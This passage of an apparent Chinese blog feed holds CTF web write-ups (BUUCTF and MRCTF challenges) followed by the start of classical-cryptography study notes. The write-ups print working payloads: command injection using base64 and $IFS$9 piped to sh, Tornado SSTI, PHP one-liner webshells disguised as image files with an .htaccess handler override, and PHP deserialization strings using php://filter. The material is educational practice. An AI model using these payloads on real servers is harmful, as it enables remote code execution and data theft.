<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">加密命令</span><br><span class="line">echo “cat flag.php” | base64</span><br><span class="line">解密命令并执行</span><br><span class="line">echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh</span><br><span class="line">然后用$IFS$<span class="number">9</span>代替空格。构造payload</span><br><span class="line"></span><br><span class="line">  ?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$<span class="number">9</span>|$IFS$9base64$IFS$<span class="number">9</span>-d$IFS$<span class="number">9</span>|$IFS$9sh  </span><br></pre></td></tr></table></figure>



<p>3)内联执行<br>linux中反引号作为内联使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cat `ls`</span><br></pre></td></tr></table></figure>
<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p> 在linux中nc 后返回网页源码html</p>
<h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><p><a href="https://blog.csdn.net/weixin_44037296/article/details/105078717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161477364616780271567725%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161477364616780271567725&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-105078717.pc_search_result_no_baidu_js&utm_term=buuctf+easy_tornado+1">BUUCTF tornado题解</a><br>tornado存在模版<a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">SSTI</a>注入漏洞，尝试通过此漏洞获取到所需内容<br>1.先访问报错网页</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">/error?msg=Error</span><br></pre></td></tr></table></figure>
<p>2.通过handler.settings对象获取cookie_secret的值，即：<br>handler指向RequestHandler<br>RequestHandler.settings指向self.application.settings<br>所以handler.settings最终指向RequestHandler.application.settings<br>构造如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>3.md5只加密二进制，所以先encode(‘utf-8’)编码为二进制,对于函数<br>hash.digest()<br>返回摘要，作为二进制数据字符串值<br>hash.hexdigest()<br>返回摘要，作为十六进制数据字符串值<br>进而根据题目已知信息编写脚本，获取payload</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h4 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h4><p>(1) 带图片头的php一句话木马</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;eval($_POST[&#x27;v&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>(2) 可解析的php后缀名：<br>php3，php4，php5，pht，phtml,phps<br>注：菜刀连接是要用POST<br>注意MMIE类型为jpeg，因为只允许图片上传<br>Content-Type: image/jpeg<br>绕过过程：<br>1.新建txt文件编写一句话木马，后缀为jpg（还有gif png等格式视情况而定）注意MMIE类型为jpeg，因为只允许图片上传<br>Content-Type: image/jpeg<br>2.Burpsuite抓包改包，修改文件后缀名，直至上传成功，如<a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload">BUUCTF upload</a>中只有php后缀名为phtml才可以<br><img src="https://img-blog.csdnimg.cn/20210304204806953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.上传成功后用蚁剑连接<br><img src="https://img-blog.csdnimg.cn/20210304204912254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最终在根目录可找到flag<br><img src="https://img-blog.csdnimg.cn/20210304205040687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="MRCTF-你传你🐎呢"><a href="#MRCTF-你传你🐎呢" class="headerlink" title="[MRCTF]你传你🐎呢"></a>[MRCTF]你传你🐎呢</h3><p>1.htaccess文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.htaccess文件(或者&quot;分布式配置文件&quot;）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</span><br><span class="line"></span><br><span class="line">概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</span><br><span class="line"></span><br><span class="line">启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</span><br><span class="line"></span><br><span class="line">笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</span><br></pre></td></tr></table></figure>
<p>2.上传.htaccess文件，注意文件名必须相同才能够被上传成功</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;webshell.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p>3.上传一句话木马webshell.jpg</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;v&#x27;</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>4.用蚁剑连接获得flag<br><img src="https://img-blog.csdnimg.cn/20210405185842801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>请求头Referer:<a href="http://xxxxx/">http://xxxxx</a><br>修改访问浏览器：在User-Agent中修改<br>在本地访问：X-Forwarded-For:127.0.0.1</p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（2021.3.24）最近做到php序列化的题</span><br><span class="line">看了好多师傅们的博客学到了很多</span><br><span class="line">Y4师傅博客：https:&#x2F;&#x2F;blog.csdn.net&#x2F;solitudi&#x2F;article&#x2F;details&#x2F;113588692?spm&#x3D;1001.2014.3001.5502</span><br><span class="line">这里就打算简单总结一下，以备之后复习</span><br></pre></td></tr></table></figure>
<ul>
<li><p>1.protected ,private,public属性<br>var 和 public 声明的字段都是公共字段，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的变量前缀符号 $。</p>
<p>  protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上 \0*\0 的前缀，注意，这里的 \0 表示 ASCII 码为 0 的字符，也就是我们经过 urlencode 后看到的 %00 。</p>
<p>  private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，字段名前面会加上 \0<declared class name>\0 的前缀，这里 <declared class name> 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。在进行长度计算的时候，会把 \0 也计算上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 再序列化内容中用大写S表示字符串，此时字符串就支持后面的字符串用16进制表示</span><br><span class="line"></span><br><span class="line">- </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### buu NiZhuanSiWei</span><br><span class="line">题目给出源码：</span><br><span class="line">&#96;&#96;&#96;javascript</span><br><span class="line">&lt;?php  </span><br><span class="line">$text &#x3D; $_GET[&quot;text&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$password &#x3D; $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;file_get_contents()函数的功能是读取文件内容到一个字符串</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  &#x2F;&#x2F;useless.php</span><br><span class="line">        $password &#x3D; unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>1.使用data伪协议和文件包含：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?text=data:text/plain,welcome to the zjctf&amp;file=php:<span class="comment">//filter/read=convert.base64-encode/resource=useless.php</span></span><br></pre></td></tr></table></figure>
<p>用php://input伪协议在以POST形式传入“ welcome to the zjctf “ 也可以用data伪协议传参</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/?text=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span></span><br><span class="line"><span class="string">``</span><span class="string">``</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>得到base64编码的页面，解密如下：</span><br><span class="line"><span class="string">``</span><span class="string">`java</span></span><br><span class="line"><span class="string">&lt;?php  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">class Flag&#123;  //flag.php （题目源码注释） </span></span><br><span class="line"><span class="string">    public $file;    </span></span><br><span class="line"><span class="string">    public function __tostring()&#123;  </span></span><br><span class="line"><span class="string">        if(isset($this-&gt;file))&#123;  </span></span><br><span class="line"><span class="string">            echo file_get_contents($this-&gt;file);    //输出文件内容,通过这个函数读取flag</span></span><br><span class="line"><span class="string">            echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="string">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span></span><br><span class="line"><span class="string">        &#125;  </span></span><br><span class="line"><span class="string">    &#125;  </span></span><br><span class="line"><span class="string">&#125;  </span></span><br><span class="line"><span class="string">?&gt;  </span></span><br></pre></td></tr></table></figure>
<p>3.反序列化：<br><img src="https://img-blog.csdnimg.cn/20210328105347570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.重新构造payload</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?text=data:text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>5.最后查看源码得到flag</p>
<h3 id="BUUCTF-网鼎杯-2020-青龙组-AreUSerialz"><a href="#BUUCTF-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="BUUCTF [网鼎杯 2020 青龙组]AreUSerialz"></a>BUUCTF [网鼎杯 2020 青龙组]AreUSerialz</h3><ul>
<li>知识点：php反序列化漏洞，弱类型比较</li>
<li>打开地址看到<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($this-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>($this-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $this-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)$this-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                $this-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) $this-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> $this-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $this-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        echo <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($this-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            $this-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $this-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
需要绕过两个地方</li>
</ul>
<p>1.绕过is_valid(),protected属性<br>方法：用大写S表示字符串，在php7.1+的环境下对属性的要求不是很敏感,用public属性绕过private属性产生的%00问题</p>
<p>2.弱类型绕过<br>__destruct()魔术方法中，op===”2”是强比较（类型和属性都等于’2’），而process()使用的是弱比较op==”2”，可以通过弱类型绕过<br>方法：op=2，这时op===”2”为false,op==”2”为true</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private function read() &#123;</span><br><span class="line">        $res &#x3D; &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res &#x3D; file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>对于file_get_contents()函数，可以用php:filter伪协议读取，将filename置为```php://filter/read=convert.base64-encode/resource=flag.php``。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<span class="comment">//或者直接读&#x27;flag.php&#x27;</span></span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">echo <span class="title">serialize</span><span class="params">(new FileHandler)</span></span>;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>
<p>payload为</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?str=O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;<span class="attr">s</span>:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/202104070956025.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag{12ffa359-defc-4dc6-b363-0b6f48c79b91}</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><ul>
<li>1.介绍SSRF <a href="https://www.jianshu.com/p/d1d1c40f6d4c">参考文章</a></li>
</ul>
<ol>
<li><p>SSRF简介</p>
<pre><code>SSRF（Server-Side Request Forgery，服务端请求伪造），是攻击者让服务端发起构造的指定请求链接造成的漏洞。


由于存在防火墙的防护，导致攻击者无法直接入侵内网；这时攻击者可以以服务器为跳板发起一些网络请求，从而攻击内网的应用及获取内网数据。
</code></pre>
</li>
<li><p>SSRF形成原因</p>
<pre><code>大都是由于服务端提供了从其它服务器获取数据的功能，比如使用户从指定的URL web应用获取图片、下载文件、读取文件内容等。但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。

最常见的例子：攻击者传入一个未经验证的URL，后端代码直接请求这个URL，就会造成SSRF漏洞。
</code></pre>
</li>
<li><p>SSRF与CSRF的区别</p>
<pre><code>CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器；

SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的URL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其它服务器。
</code></pre>
</li>
<li><p>SSRF的类型</p>
<pre><code>1）显示对攻击者的响应（basic）：在服务器获取攻击者要求的URL后，把响应发送回攻击者。
2）不显示响应（blind）：在服务器获取攻击者要求的URL后，不会把响应内容发送给攻击者，需要通过抓包或查看服务器日志判断是否存在服务端请求伪造漏洞。
</code></pre>
</li>
<li><p>利用SSRF可以实现的攻击</p>
<pre><code>1）获取web应用可达服务器的banner信息（如软件开发商、软件名称等），以及收集内网web应用的指纹识别（如开放的端口、中间件版本等），根据这些信息再进行进一步的渗透；
2）攻击运行在内网的系统或应用程序，获取内网系统弱口令进行内网漫游，对有漏洞的内网web应用实施攻击获取webshell（如Struts2命令执行，discuz!论坛SSRF通过Redis实施getshell等）；
3）利用有脆弱性的组件结合ftp://，file:///，gopher://，dict://等协议实施攻击（如FFmpeg任意文件读取，XXE攻击等）。
</code></pre>
</li>
<li><p>拓展攻击面</p>
<pre><code>结合gopher协议攻击内网FTP、Telnet、Redis、FastCGI、Memcache，也可以进行get、post请求。
</code></pre>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/undefined/%5B%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%5D%20Crypto%20%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%EF%BC%88%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81&amp;&amp;%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86&amp;&amp;hash%E5%87%BD%E6%95%B0%EF%BC%89.html</url>
    <content><![CDATA[<p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<h1 id="一-常见加解密"><a href="#一-常见加解密" class="headerlink" title="一 . 常见加解密"></a>一 . 常见加解密</h1><h2 id="SM1-4"><a href="#SM1-4" class="headerlink" title="SM1-4"></a>SM1-4</h2><p>国密即国家密码局认定的国产密码算法。主要有SM1，SM2，SM3，SM4。密钥长度和分组长度均为128位。</p>
<p>SM1 为对称加密。其加密强度与AES相当。该算法不公开，调用该算法时，需要通过加密芯片的接口进行调用。</p>
<p>SM2为非对称加密，基于ECC。该算法已公开。由于该算法基于ECC，故其签名速度与秘钥生成速度都快于RSA。ECC 256位（SM2采用的就是ECC 256位的一种）安全强度比RSA 2048位高，但运算速度快于RSA。</p>
<p>SM3 消息摘要。可以用MD5作为对比理解。该算法已公开。校验结果为256位。</p>
<p>SM4 无线局域网标准的分组数据算法。对称加密，密钥长度和分组长度均为128位。</p>
<h1 id="二-古典密码"><a href="#二-古典密码" class="headerlink" title="二. 古典密码"></a>二. 古典密码</h1><h2 id="代换密码"><a href="#代换密码" class="headerlink" title="代换密码"></a>代换密码</h2><p> 分类：</p>
<ul>
<li><p>移位（凯撒）密码<br><img src="https://img-blog.csdnimg.cn/20210421163417180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>仿射密码<br><img src="https://img-blog.csdnimg.cn/2021042116340479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>单表代换</p>
</li>
<li><p>多表代换</p>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20210421163447210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="置换密码"><a href="#置换密码" class="headerlink" title="置换密码"></a>置换密码</h2><p><img src="https://img-blog.csdnimg.cn/20210421163320209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210421163332972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Hill密码"><a href="#Hill密码" class="headerlink" title="Hill密码"></a>Hill密码</h2><p><img src="https://img-blog.csdnimg.cn/20210421163135304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210421163148731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="转轮密码"><a href="#转轮密码" class="headerlink" title="转轮密码"></a>转轮密码</h2><p>恩格码机</p>
<h2 id="代换密码的唯密文攻击"><a href="#代换密码的唯密文攻击" class="headerlink" title="代换密码的唯密文攻击"></a>代换密码的唯密文攻击</h2><ul>
<li>1.统计攻击</li>
<li>2.重合指数法<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2></li>
</ul>
<ol>
<li>密码分析可分为那几类，它们的含义是什么？<br>根据密码分析者可能取得的分析资料的不同，密码分析（或称攻击）可分为下列四类：<br>1）唯密文分析（攻击），密码分析者取得一个或多个用同一密钥加密的密文；<br>2）已知明文分析（攻击），除要破译的密文外，密码分析者还取得一些用同一密钥加密的明密文对；<br>3）选择明文分析（攻击），密码分析者可取得他所选择的任何明文所对应的密文（当然不包括他要恢复的明文），这些明密文对和要破译的密文是用同一密钥加密的；<br>4）选择密文分析（攻击），密码分析者可取得他所选择的任何密文所对应的明文（要破译的密文除外），这些密文和明文和要破译的密文是用同一解密密钥解密的，它主要应用于公钥密码体制。</li>
<li>移位密码，仿射密码，单表代换密码都没有破坏明文的频率统计规律，可以直接用统计分析法<br><img src="https://img-blog.csdnimg.cn/20210421162140152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>字母频率分析法对（单表代换密码）算法最有效<br><img src="https://img-blog.csdnimg.cn/2021042116222073.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><img src="https://img-blog.csdnimg.cn/2021042116395986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210421164031612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
